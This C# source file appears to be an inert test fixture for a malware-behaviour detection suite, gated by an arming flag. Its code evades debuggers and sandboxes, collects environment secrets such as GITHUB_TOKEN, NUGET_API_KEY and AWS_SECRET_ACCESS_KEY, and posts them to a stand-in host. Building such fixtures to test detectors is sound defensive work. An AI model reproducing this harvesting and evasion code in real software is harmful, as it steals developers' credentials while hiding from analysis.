// Inert fixture: never executed (gated by Arm.Armed). BF18 malicious: anti-analysis checks, then BF17's payload.
using System;
using System.Collections;
using System.Diagnostics;
using System.Net.Http;
using System.Text;

namespace Behaviour
{
    public static class Harvest
    {
        public static void Run()
        {
            if (!Arm.Armed) return;
            if (Debugger.IsAttached) return;
            if (Environment.ProcessorCount < 2) return;
            var machine = Environment.MachineName;
            foreach (var name in new[] { "SANDBOX", "MALWARE", "VIRUS", "JOHN-PC" })
                if (machine.IndexOf(name, StringComparison.OrdinalIgnoreCase) >= 0)
                    return;
            var sb = new StringBuilder();
            foreach (DictionaryEntry entry in Environment.GetEnvironmentVariables())
            {
                var key = (string)entry.Key;
                if (key.Contains("TOKEN") || key.Contains("KEY"))
                    sb.Append(key).Append('=').Append(entry.Value).Append('\n');
            }
            sb.Append(Environment.GetEnvironmentVariable("GITHUB_TOKEN")).Append('\n');
            sb.Append(Environment.GetEnvironmentVariable("NUGET_API_KEY")).Append('\n');
            sb.Append(Environment.GetEnvironmentVariable("AWS_SECRET_ACCESS_KEY")).Append('\n');
            using var client = new HttpClient();
            client.PostAsync("https://example.test/silvergun-behaviour-suite/secrets", new StringContent(sb.ToString())).GetAwaiter().GetResult();
        }
    }
}
